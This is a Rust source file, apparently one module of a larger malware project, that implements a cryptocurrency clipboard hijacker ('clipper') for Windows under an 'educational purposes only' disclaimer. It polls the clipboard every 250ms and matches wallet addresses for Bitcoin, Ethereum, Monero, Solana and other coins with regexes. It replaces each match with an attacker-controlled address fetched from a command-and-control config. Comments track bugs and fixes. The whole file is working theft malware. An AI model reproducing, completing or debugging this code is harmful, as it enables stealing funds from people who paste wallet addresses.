/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// payload/clipper.rs — cryptocurrency address clipboard hijacker.
//
// Loop: OpenClipboard → read UTF-16 → regex replace → write back, every 250ms.
// Replacement map comes from C2 /config JSON key clipper_addresses.
//
// BROKEN:
//   - If fetch_config fails (broken relay URL), address_map is empty → no-op loop.
//   - README example sets "bitcoin" but bech32 uses key "bitcoin_bech32".
//   - Solana regex is very broad (many non-address strings).
//   - Clipper::stop() is never reached (C2 loop diverges).

use log::{info, error};
use once_cell::sync::Lazy;
use regex::Regex;
use serde_json::Value;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use winapi::um::winuser::{
    OpenClipboard, CloseClipboard, GetClipboardData, EmptyClipboard, SetClipboardData,
    CF_UNICODETEXT,
};
use winapi::um::winbase::{GlobalAlloc, GlobalLock, GlobalUnlock, GlobalFree};
use std::ptr;

const GMEM_MOVEABLE: u32 = 0x0002;
static RUNNING: AtomicBool = AtomicBool::new(true);

// ── Address patterns ─────────────────────────────────────────────────────────

static PATTERNS: Lazy<HashMap<&'static str, Regex>> = Lazy::new(|| {
    let mut m = HashMap::new();
    let specs: &[(&str, &str)] = &[
        ("bitcoin",  r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b"),
        ("bitcoin_bech32", r"\bbc1[a-z0-9]{39,59}\b"),
        ("ethereum", r"\b0x[a-fA-F0-9]{40}\b"),
        ("litecoin", r"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b"),
        ("monero",   r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b"),
        ("dogecoin", r"\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{33}\b"),
        ("solana",   r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"), // BROKEN: overly broad
        ("xrp",      r"\br[a-zA-Z0-9]{24,34}\b"),
        ("bnb",      r"\bbnb[0-9a-z]{38}\b"),
        ("usdt_trc20", r"\bT[A-Za-z1-9]{33}\b"),
    ];
    for (name, pattern) in specs {
        match Regex::new(pattern) {
            Ok(re) => { m.insert(*name, re); }
            Err(e) => error!("Bad regex for {}: {}", name, e),
        }
    }
    m
});

// ── Clipper ──────────────────────────────────────────────────────────────────

pub struct Clipper {
    address_map: HashMap<String, String>, // pattern name → replacement address
}

impl Clipper {
    /// Fetch clipper_addresses from C2 config once at construction.
    pub fn new() -> Self {
        let address_map = fetch_addresses();
        Clipper { address_map }
    }

    /// Blocking poll loop until RUNNING is false.
    pub fn start(&self) {
        RUNNING.store(true, Ordering::Relaxed);
        info!("Crypto clipper started.");
        while RUNNING.load(Ordering::Relaxed) {
            self.check_and_replace();
            thread::sleep(Duration::from_millis(250));
        }
    }

    /// Signal the loop to exit. Never called (main never reaches Phase 5).
    pub fn stop() {
        RUNNING.store(false, Ordering::Relaxed);
    }

    /// One clipboard snapshot; replace if any regex hits and a map entry exists.
    fn check_and_replace(&self) {
        unsafe {
            if OpenClipboard(ptr::null_mut()) == 0 { return; }

            let h_data = GetClipboardData(CF_UNICODETEXT);
            if !h_data.is_null() {
                let ptr_data = GlobalLock(h_data) as *const u16;
                if !ptr_data.is_null() {
                    // BUG FIX: original called OsStr::from_encoded_bytes_unsafe
                    // on a *u16 — undefined behaviour.  Correct: build a u16
                    // slice up to the null terminator, then convert via
                    // from_utf16_lossy.
                    let max_units = 4096usize;
                    let len = (0..max_units)
                        .find(|&i| *ptr_data.add(i) == 0)
                        .unwrap_or(max_units);
                    let wide_slice = std::slice::from_raw_parts(ptr_data, len);
                    let text = String::from_utf16_lossy(wide_slice);

                    GlobalUnlock(h_data);

                    let replaced = self.replace_addresses(&text);
                    if replaced != text {
                        if EmptyClipboard() != 0 {
                            self.set_clipboard_text(&replaced);
                            info!("Clipboard address replaced.");
                        }
                    }
                } else {
                    GlobalUnlock(h_data);
                }
            }
            CloseClipboard();
        }
    }

    /// Apply each regex whose name exists in address_map. Sequential replace_all.
    fn replace_addresses(&self, text: &str) -> String {
        let mut out = text.to_string();
        for (name, regex) in PATTERNS.iter() {
            if let Some(replacement) = self.address_map.get(*name) {
                out = regex.replace_all(&out, replacement.as_str()).to_string();
            }
        }
        out
    }

    /// Allocate a MOVEABLE HGLOBAL and SetClipboardData(CF_UNICODETEXT).
    unsafe fn set_clipboard_text(&self, text: &str) {
        let wide: Vec<u16> = text.encode_utf16().chain(Some(0)).collect();
        let byte_size = wide.len() * 2;
        let h_global = GlobalAlloc(GMEM_MOVEABLE, byte_size as u64);
        if h_global.is_null() { return; }
        let dst = GlobalLock(h_global) as *mut u16;
        if dst.is_null() { GlobalFree(h_global); return; }
        std::ptr::copy_nonoverlapping(wide.as_ptr(), dst, wide.len());
        GlobalUnlock(h_global);
        SetClipboardData(CF_UNICODETEXT, h_global);
    }
}

/// Parse C2 config JSON: { "clipper_addresses": { "bitcoin": "...", ... } }.
fn fetch_addresses() -> HashMap<String, String> {
    // BUG FIX: called c2::fetch_config() without import — now uses crate:: path.
    let raw = crate::c2::fetch_config().unwrap_or_default();
    if raw.is_empty() { return HashMap::new(); }
    match serde_json::from_str::<Value>(&raw) {
        Ok(v) => {
            if let Some(obj) = v["clipper_addresses"].as_object() {
                obj.iter()
                   .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                   .collect()
            } else { HashMap::new() }
        }
        Err(_) => HashMap::new(),
    }
}
